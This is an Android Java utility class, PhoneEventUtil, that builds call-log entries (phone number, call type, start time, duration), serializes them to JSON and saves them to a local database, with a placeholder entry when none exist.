package com.xaviar.collect.phone_event;

import java.util.Collection;
import java.util.LinkedList;
import java.util.List;

import android.content.Context;
import android.util.Log;

import com.xaviar.collect.calllog.CallLogEntry;
import com.xaviar.events.PhoneEventReceiver;
import com.xaviar.frm.DataHolder;
import com.xaviar.ui.UserData;
import com.xaviar.utils.DbUtil;

import flexjson.JSONSerializer;

public class PhoneEventUtil {
	
	private static final String TAG = PhoneEventUtil.class.getSimpleName();
	

	public static String getAllPhoneGeneric(Context ctx) {
		 String  genericData = DbUtil.getAllGeneric(ctx,DataHolder.PHONE_EVENT);
		 if(genericData.length() < 6)
		 {
			  return generateEmptyPhoneEvent();	  	 
		 }
		return genericData;
	}
	

	private static String generateEmptyPhoneEvent() {
		CallLogEntry phone = new CallLogEntry();
		 phone.setPhoneNumber("099999999");		 
		 phone.setType("Income");		
		 List<CallLogEntry> allPhones = new LinkedList<CallLogEntry>();
		 allPhones.add(phone);
		 String ret = PhoneEventReceiver.toJsonArray(allPhones);
		 Log.d(TAG,"toJsonArray:" + ret);	
		return ret;
	}
	
	public static void save(Context ctx, CallLogEntry callLogEntry) {
		Log.d(TAG, "enter  save(..)");
		if(null ==callLogEntry)
		{
		 return; // avoid null pointer ..	
		}
		List<CallLogEntry> listPhone = new LinkedList<CallLogEntry>();
		listPhone.add(callLogEntry);
		String jsonText = toJsonArray(listPhone);
		int index1 = jsonText.indexOf("[");
		jsonText = jsonText.substring(index1 + 1);
		jsonText = jsonText.substring(0, jsonText.lastIndexOf(']'));
		Log.w(TAG, "save:jsonText:" + jsonText);
		UserData userData = new UserData();
		userData.setText(jsonText);
		userData.setSource(DataHolder.PHONE_EVENT);
		List<UserData> userDataList = new LinkedList<UserData>();
		userDataList.add(userData);
		DbUtil.update(ctx, userDataList);
	}
	
    public static CallLogEntry createStartCallData(String phoneNumber,String type) {
		
		Log.d(TAG, "phoneNumber:" + phoneNumber);
		long start_time_ring = System.currentTimeMillis();
		String startTimeRingStr = String.valueOf(start_time_ring);
		CallLogEntry callLogEntry = new CallLogEntry();
		callLogEntry.setPhoneNumber(phoneNumber);
		callLogEntry.setType(type);			
		callLogEntry.setTimeSeconds(startTimeRingStr);
		callLogEntry.setId(startTimeRingStr);
		return callLogEntry;
	}	
	
	public static void createEndCallData(CallLogEntry callLogEntry) {
		long end_time = System.currentTimeMillis();
		long start_time = end_time - 10000; // default start time in case of null start time....
		if(null != callLogEntry)
		{
		  start_time 	=  Long.valueOf(callLogEntry.getTimeSeconds());
		}
		long duration = end_time - start_time;
		callLogEntry.setDuration(String.valueOf(duration));			
	}
    
	private static void createEndCallWhenNoStartCall() {
		// TODO Auto-generated method stub
		
	}


	public static String toJsonArray(Collection<CallLogEntry> collection) {
		return new JSONSerializer().exclude("*.class").serialize(collection);
	}

}
